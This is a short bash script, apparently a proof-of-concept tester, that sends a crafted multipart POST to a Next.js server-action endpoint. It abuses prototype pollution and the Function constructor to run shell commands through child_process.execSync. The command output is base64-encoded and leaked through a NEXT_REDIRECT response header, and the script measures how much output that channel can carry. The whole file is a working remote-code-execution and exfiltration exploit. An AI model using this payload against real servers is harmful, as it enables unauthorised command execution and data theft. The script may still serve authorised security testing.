#!/bin/bash
# test-size-limit.sh - Find the max output size for redirect exfil

TARGET="${1:-http://localhost:3443}"
SIZE="${2:-1000}"

TMPDIR=$(mktemp -d)
CHUNK0="${TMPDIR}/chunk0.json"
CHUNK1="${TMPDIR}/chunk1.json"

cleanup() { rm -rf "${TMPDIR}"; }
trap cleanup EXIT

# Simple command: generate SIZE 'A' characters
# Using node for predictable output without shell escaping issues
CMD="node -e \"console.log('A'.repeat(${SIZE}))\""

# Build redirect payload
PAYLOAD="var o=Buffer.from(process.mainModule.require('child_process').execSync('${CMD}')).toString('base64');var e=new Error();e.digest='NEXT_REDIRECT;push;http://x/'+o+';307;';throw e;"

printf '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B0\\"}","_response":{"_prefix":"%s","_formData":{"get":"$1:constructor:constructor"}}}' "$PAYLOAD" > "${CHUNK0}"

printf '"$@0"' > "${CHUNK1}"

RESPONSE=$(curl -s -D - -o /dev/null \
    -X POST "${TARGET}" \
    -H "Next-Action: x" \
    -F "0=<${CHUNK0}" \
    -F "1=<${CHUNK1}" \
    --max-time 30 \
    2>&1)

HTTP_CODE=$(echo "$RESPONSE" | grep -E "^HTTP/" | tail -1 | awk '{print $2}')
HAS_REDIRECT=$(echo "$RESPONSE" | grep -ci "x-action-redirect" || true)

# SIZE chars + newline -> base64 (1.33x) = ~1.33x expansion + overhead
EXPECTED_HEADER_SIZE=$((SIZE * 133 / 100 + 30))

if [[ "$HAS_REDIRECT" -gt 0 ]]; then
    echo "OK: ${SIZE} chars -> ~${EXPECTED_HEADER_SIZE} bytes in header (HTTP ${HTTP_CODE})"
else
    echo "FAIL: ${SIZE} chars (HTTP ${HTTP_CODE})"
fi
